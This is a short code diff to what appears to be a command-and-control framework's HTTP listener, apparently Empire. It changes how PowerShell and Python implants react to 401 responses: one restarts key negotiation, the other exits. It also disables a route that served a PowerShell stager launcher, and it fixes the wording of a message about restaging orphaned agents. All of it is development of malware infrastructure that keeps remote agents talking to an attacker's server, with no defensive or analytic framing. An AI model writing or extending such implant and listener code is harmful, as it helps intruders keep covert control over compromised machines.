@@ -708,6 +708,10 @@ class Listener:
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
                                 }
                             }
                         }
@@ -758,6 +762,10 @@ def send_message(packets=None):
     except urllib2.HTTPError as HTTPError:
         # if the server is reached, but returns an erro (like 404)
         missedCheckins = missedCheckins + 1
+        #if signaled for restaging, exit.
+        if HTTPError.code == 401:
+            sys.exit(0)
+        
         return (HTTPError.code, '')
 
     except urllib2.URLError as URLerror:
@@ -801,13 +809,14 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/<string:stagerURI>')
-        def send_stager(stagerURI):
-            if stagerURI:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                return launcher
-            else:
-                pass
+        #@app.route('/<string:stagerURI>')
+        #def send_stager(stagerURI):
+            #if stagerURI:
+                #launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                #return launcher
+            #else:
+                #pass
+
         @app.before_request
         def check_ip():
             """
@@ -882,7 +891,7 @@ def send_message(packets=None):
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
-                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
+                                    print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
